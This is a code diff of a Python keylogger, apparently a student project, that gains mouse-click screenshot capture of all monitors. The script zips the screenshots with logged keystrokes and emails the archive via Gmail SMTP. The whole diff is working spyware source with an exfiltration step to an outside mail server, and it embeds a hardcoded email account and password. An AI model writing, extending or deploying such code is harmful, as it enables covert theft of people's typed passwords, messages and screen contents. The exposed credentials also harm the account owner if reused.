@@ -1,9 +1,16 @@
-from pynput import keyboard
+from pynput import keyboard, mouse
 from threading import Timer
 import smtplib
 from email.message import EmailMessage
 import ctypes
 import os
+import win32gui
+import win32ui
+import win32con
+import win32api
+from zipfile import ZipFile
+import PIL
+
 
 
 def get_capslock_state():
@@ -16,7 +23,7 @@ def update_txt_file(key):
     key_string = str(key).replace("'", "")
     do_nothing = 1
 
-    with open(file_path, 'a') as file:
+    with open(log_path, 'a') as file:
         # Armazena o estado do capslock
         caps_lock_state = get_capslock_state()
 
@@ -31,8 +38,8 @@ def update_txt_file(key):
             file.write(' ')
         # Apaga um caractere
         elif key_string == 'Key.backspace':
-            with open(file_path, 'rb+') as file:
-                file_size = os.path.getsize(file_path)
+            with open(log_path, 'rb+') as file:
+                file_size = os.path.getsize(log_path)
                 if file_size > 0:
                     file.seek(-1, os.SEEK_END)
                     file.truncate()
@@ -59,12 +66,12 @@ def send_email(email, password, receiver, subject='(no subject)'):
     msg['Subject'] = subject
     msg['To'] = receiver
 
-    with open(file_path, "rb") as myfile:
+    with open('log.zip', "rb") as myfile:
         file_data = myfile.read()
         file_name = myfile.name
         msg.add_attachment(file_data,
                            maintype="application",
-                           subtype='json',
+                           subtype='zip',
                            filename=file_name)
 
     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
@@ -73,22 +80,78 @@ def send_email(email, password, receiver, subject='(no subject)'):
         server.send_message(msg)
 
 
+def on_click(x, y, button, pressed):
+    global number_of_clicks
+
+    if pressed and number_of_clicks < 5:
+        number_of_clicks += 1
+        print('click')
+        # copy the screen into our memory device context
+        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),
+                      win32con.SRCCOPY)
+        # # save the bitmap to a file
+        screenshot.SaveBitmapFile(
+            mem_dc, 'screenshot' + f'{number_of_clicks}' + '.jpg')
+
+
+# grab a handle to the main desktop window
+hdesktop = win32gui.GetDesktopWindow()
+
+# determine the size of all monitors in pixels
+width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+
+# create a device context
+desktop_dc = win32gui.GetWindowDC(hdesktop)
+img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+
+# create a memory based device context
+mem_dc = img_dc.CreateCompatibleDC()
+
+# create a bitmap object
+screenshot = win32ui.CreateBitmap()
+screenshot.CreateCompatibleBitmap(img_dc, width, height)
+mem_dc.SelectObject(screenshot)
+
 x = False  # Value to if held
-file_path = 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json
+log_path = 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json
+number_of_clicks = 0
+execution_time = 10
 
 print("[+] Keylogger funcionando com sucesso!")
-print(f"[!] Salvando dados no diretório '{file_path}'")
+print(f"[!] Salvando dados no diretório '{log_path}'")
 
-with keyboard.Listener(on_press=on_press) as listener:
-    Timer(8, listener.stop).start()
-    listener.join()
+with keyboard.Listener(on_press=on_press) as k_listener:
+    with mouse.Listener(on_click=on_click) as m_listener:
+        Timer(execution_time, m_listener.stop).start()
+        Timer(execution_time, k_listener.stop).start()
+        m_listener.join()
+        k_listener.join()
+
+# free our objects
+mem_dc.DeleteDC()
+win32gui.DeleteObject(screenshot.GetHandle())
 
 print("[-] Keylogger finalizado!")
 
-try:
-    send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
-               'd.lima@aln.senaicimatec.edu.br', 'keylogger')
-except:
-    print("Couldn't send email")
-else:
-    print("Email sent!")
+# create a ZipFile object
+zipObj = ZipFile('log.zip', 'w')
+# Add multiple files to the zip
+zipObj.write('logs.txt')
+zipObj.write('screenshot1.jpg')
+zipObj.write('screenshot2.jpg')
+zipObj.write('screenshot3.jpg')
+zipObj.write('screenshot4.jpg')
+zipObj.write('screenshot5.jpg')
+# close the Zip File
+zipObj.close()
+
+# try:
+send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
+           'd.lima@aln.senaicimatec.edu.br', 'keylogger')
+# except:
+#     print("Couldn't send email")
+# else:
+#     print("Email sent!")
